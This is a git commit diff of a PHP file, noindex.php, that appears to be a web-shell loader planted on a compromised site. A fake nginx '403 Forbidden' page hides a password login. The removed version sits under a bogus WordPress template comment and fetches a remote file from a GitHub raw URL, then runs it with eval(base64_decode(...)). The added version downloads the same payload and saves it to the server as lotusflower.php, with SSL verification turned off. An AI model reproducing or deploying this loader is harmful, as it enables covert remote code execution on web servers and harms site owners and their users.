c019a73ac09e65b640841507a1d823cd4981b2ea
soy777 <rachmatagustio@gmail.com>
2025-09-12 02:43:20 +0700

    Update noindex.php

--- noindex.php
+++ noindex.php
@@ -2,11 +2,12 @@
 $auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";
 
 function Login() {
-  die("<html>
-  <title>403 Forbidden</title>
-  <center><h1>403 Forbidden</h1></center>
-  <hr><center>nginx (You don't have permission access to server / on this server) </center>
-  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
+    die("<html>
+    <title>403 Forbidden</title>
+    <center><h1>403 Forbidden</h1></center>
+    <hr><center>nginx (You don't have permission access to server / on this server)</center>
+    <center><form method='post'><input type='password' name='pass' style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;'></form></center>
+    </html>");
 }
 
 function VEsetcookie($k, $v) {
@@ -15,39 +16,41 @@ function VEsetcookie($k, $v) {
 }
 
 if (!empty($auth_pass)) {
-    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
+    if (isset($_POST['pass']) && hash('sha256', $_POST['pass']) === $auth_pass) {
         VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+    }
 
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] !== $auth_pass) {
         Login();
+    }
 }
-?>
-<?php
-/*
- * The searchform.php template.
- *
- * Used any time that get_search_form() is called.
- *
- * @link https://wordpress.org/themes/template/
- * @package WordPress
- * @subpackage
- * @since 1.0 */
 
-$l = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
+$remote_file = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
+$local_file = __DIR__ . "/lotusflower.php";
 
-		if( function_exists('curl_init') ) {
-			$ch = curl_init();
-			curl_setopt($ch, CURLOPT_URL, $l);
-			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-			curl_setopt($ch, CURLOPT_HEADER, FALSE);
-			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
-			$body = curl_exec($ch);
-			curl_close($ch);
-		}
-		else {
-			$body = @file_get_contents($l);
-		}
-	 eval(base64_decode($body));
+$body = '';
+
+if (function_exists('curl_init')) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $remote_file);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
+    $body = curl_exec($ch);
+    curl_close($ch);
+} else {
+    $body = @file_get_contents($remote_file);
+}
+
+if (!empty($body)) {
+    if (file_put_contents($local_file, $body)) {
+        echo "File berhasil diunduh dan disimpan: " . $local_file;
+    } else {
+        echo "Gagal menyimpan file. Periksa permission folder.";
+    }
+} else {
+    echo "Gagal download file dari GitHub. Periksa URL dan koneksi.";
+}
 ?>
